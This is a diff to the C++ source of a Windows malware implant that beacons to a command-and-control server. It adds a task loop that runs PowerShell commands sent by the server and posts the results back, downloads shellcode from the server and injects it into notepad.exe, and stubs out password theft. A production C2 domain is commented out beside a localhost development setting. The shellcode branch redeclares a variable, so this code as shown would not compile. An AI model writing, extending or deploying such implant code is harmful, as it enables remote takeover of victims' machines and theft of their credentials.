@@ -5,27 +5,29 @@
 #include "http.h"
 #include "exec_shell.h"
 #include "aes_gcm.h"
+#include "inject.h"
 #include "nlohmann/json.hpp"
 
 using json = nlohmann::json;
 
 // implant configurations
 
-// production domain
+// uncomment the following for production
 // LPCWSTR c2Domain = L"c2-server-app.herokuapp.com";
 // int port = 443;
+// BOOL useTLS = TRUE;
 
-// development domain
+// uncomment the following for development
 LPCWSTR c2Domain = L"127.0.0.1";
 int port = 5000;
+BOOL useTLS = FALSE;
 
 LPCWSTR registerURI = L"/agent/register";
 LPCWSTR getTaskURI = L"/agent/get_task";
-LPCWSTR sendResultURI = L"agent/send_result";
+LPCWSTR sendResultURI = L"agent/send_results";
 std::string password = "magic_conch";
 std::string agentId;
 DWORD sleepTime = 10 * 1000;
-BOOL useTLS = FALSE;  // set to true for HTTPs
 
 // generate a random agent id of size digits
 std::string generateRandomId(int size) {
@@ -65,27 +67,97 @@ BOOL registerAgent() {
 }
 
 // execute the list of commands and send the result back to the server
-void executeCommands(std::vector<std::string> cmds) {
-    for (int i = 0; i < cmds.size(); i++) {
-        std::string result = exec_shell(&*cmds[i].begin());
-        std::cout << result << std::endl;
+void executeTasks(std::vector<json> tasks) {
+    for (int i = 0; i < tasks.size(); i++) {
+        // json task = json::parse(tasks[i]);
+        json task = tasks[i];
+        if (task["command_type"] == "powershell_cmd") {
+            std::string cmd = task["cmd"];
+            std::string result = exec_shell(&*( cmd.begin() ));
+            std::cout << result << std::endl;
 
-        json jsonResult = {
-            {"agent_id", agentId},
-            {"password", password},
-            {"command", cmds[i]},
-            {"result", result}
-        };
+            json jsonResult = {
+                {"job_id", task["job_id"]},
+                {"agent_id", agentId},
+                {"password", password},
+                {"results", result}
+            };
 
-        std::string jsonString = jsonResult.dump();
+            std::string jsonString = jsonResult.dump();
 
-        std::string response = httpPost(c2Domain, port, sendResultURI, jsonString, useTLS);
+            std::string response = httpPost(c2Domain, port, sendResultURI, jsonString, useTLS);
 
-        if (response == "Error") {
-            return;
+            if (response == "Error") {
+                return;
+            }
+
+            std::cout << response << std::endl;
+        } else if (task["command_type"] == "steal") {
+            std::cout << "steal some passwords (placeholder)" << std::endl;
+            // add implementation here
+
+            json jsonResult = {
+                {"job_id", task["job_id"]},
+                {"agent_id", agentId},
+                {"password", password},
+                {"results", ""}
+            };
+
+            std::string jsonString = jsonResult.dump();
+
+            std::string response = httpPost(c2Domain, port, sendResultURI, jsonString, useTLS);
+
+            if (response == "Error") {
+                return;
+            }
+
+            std::cout << response << std::endl;
+
+        } else if (task["command_type"] == "shellcode") {
+            std::string exePath = "C:\\WINDOWS\\System32\\notepad.exe";
+            std::string response = httpGet(c2Domain, port, L"/agent/get_shellcode", useTLS);
+            std::cout << response.size() << std::endl;
+            char* shellcode = &*response.begin();
+            std::cout << inject(exePath, shellcode, response.size()) << std::endl;
+
+            json jsonResult = {
+                {"job_id", task["job_id"]},
+                {"agent_id", agentId},
+                {"password", password},
+                {"results", ""}
+            };
+
+            std::string jsonString = jsonResult.dump();
+
+            std::string response = httpPost(c2Domain, port, sendResultURI, jsonString, useTLS);
+
+            if (response == "Error") {
+                return;
+            }
+
+            std::cout << response << std::endl;
+        } else if (task["command_type"] == "change_config") {
+            std::cout << "change some configuration (placeholder)" << std::endl;
+            // add implementation here
+
+            json jsonResult = {
+                {"job_id", task["job_id"]},
+                {"agent_id", agentId},
+                {"password", password},
+                {"results", ""}
+            };
+
+            std::string jsonString = jsonResult.dump();
+
+            std::string response = httpPost(c2Domain, port, sendResultURI, jsonString, useTLS);
+
+            if (response == "Error") {
+                return;
+            }
+
+            std::cout << response << std::endl;
         }
-
-        std::cout << response << std::endl;
+        
     }
 }
 
@@ -106,8 +178,9 @@ void getTasksAndExecute() {
     json jsonResponse = json::parse(response);
 
     if (jsonResponse["status"] == "ok") {
-        std::vector<std::string> cmds = jsonResponse["cmd"];
-        executeCommands(cmds);
+        std::cout << jsonResponse["tasks"] << std::endl;
+        std::vector<json> tasks = jsonResponse["tasks"];
+        executeTasks(tasks);
     } else {
         std::cout << "no tasks at this time" << std::endl;
     }
